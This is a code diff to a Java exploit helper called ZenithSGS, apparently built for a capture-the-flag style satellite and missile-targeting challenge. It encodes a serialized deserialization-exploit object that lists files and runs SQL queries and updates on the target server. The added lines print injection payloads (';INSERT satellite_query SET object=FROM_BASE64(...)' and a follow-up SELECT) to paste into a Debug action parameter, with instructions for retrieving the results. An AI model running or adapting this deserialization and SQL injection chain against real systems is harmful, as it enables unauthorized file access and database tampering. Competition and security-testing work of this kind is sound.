@@ -7,7 +7,7 @@
 * to leverage the vulnerabilities found in the SatelliteQueryFileFolderUtility class.
 *
 * Usage:
-* java -jar ZenithSGS.jar -d "<decode base64 encoded serialized object>"
+* java -jar ZenithSGS.jar -d "<base64 encoded serialized object to decode>"
 * java -jar ZenithSGS.jar -sf "<file or directory to list on server>"
 * java -jar ZenithSGS.jar -sq "<SQL query to run on server>"
 * java -jar ZenithSGS.jar -su "<SQL update query to run on server>"
@@ -59,7 +59,7 @@ public class ZenithSGS {
                 "A basic Java object deserialize/serialize app for decoding/encoding the deserialization exploit object\n" +
                 "to leverage the vulnerabilities found in the SatelliteQueryFileFolderUtility class.\n\n" +
                 "Usage:\n" +
-                "java -jar ZenithSGS.jar -d \"<decode base64 encoded serialized object>\"\n" +
+                "java -jar ZenithSGS.jar -d \"<base64 encoded serialized object to decode>\"\n" +
                 "java -jar ZenithSGS.jar -sf \"<file or directory to list on server>\"\n" +
                 "java -jar ZenithSGS.jar -sq \"<SQL query to run on server>\"\n" +
                 "java -jar ZenithSGS.jar -su \"<SQL update query to run on server>\"";
@@ -79,7 +79,13 @@ public class ZenithSGS {
         ostream.writeObject(cmdobj);
         ostream.close();
         String b64obj = Base64.getEncoder().encodeToString(bstream.toByteArray());
+        System.out.println("Object to serialize:\n" + cmd + " " + isQuery + " " + isUpdate);
         System.out.println("Serialized object (base64 encoded):\n" + b64obj);
+        System.out.println("\nPaste the following lines, in order, with each as a separate submit, into the missile-targeting-system Action service Debug action parameter:");
+        System.out.println(";INSERT satellite_query SET object=FROM_BASE64('" + b64obj + "');");
+        System.out.println(";SELECT * FROM satellite_query WHERE jid=(SELECT MAX(jid) FROM satellite_query);\n");
+        System.out.println("Click the missile-targeting-system Parameter service getValue for Debug or PointingMode to retrieve the results.");
+        System.out.println("Note: some queries and file/directory listings may require a running packet capture prior to submitting in order to obtain all the output.");
     }
 }
 
